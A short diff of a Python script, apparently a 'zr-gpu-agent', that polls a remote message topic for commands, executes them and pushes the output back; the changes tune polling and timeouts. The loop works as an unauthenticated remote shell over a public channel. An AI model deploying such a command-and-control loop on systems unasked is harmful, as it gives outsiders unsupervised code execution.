@@ -92,9 +92,10 @@ def main():
     seen = set()
     while True:
         try:
-            since = int(time.time()) - 180
-            req = urllib.request.Request(f"{CMD_TOPIC}/json?since={since}&timeout=55")
-            with urllib.request.urlopen(req, timeout=65) as r:
+            since = int(time.time()) - 120
+            req = urllib.request.Request(f"{CMD_TOPIC}/json?since={since}&poll=0",
+                                         headers={'User-Agent': 'zr-gpu-agent'})
+            with urllib.request.urlopen(req, timeout=25) as r:
                 msgs = json.loads(r.read())
             for m in msgs:
                 mid = m.get("id", "")
@@ -121,6 +122,7 @@ def main():
                     except Exception as e:
                         out = "[EXEC-ERR] " + repr(e)
                 push_res(out)
+            time.sleep(5)
         except Exception as e:
             time.sleep(5)
 
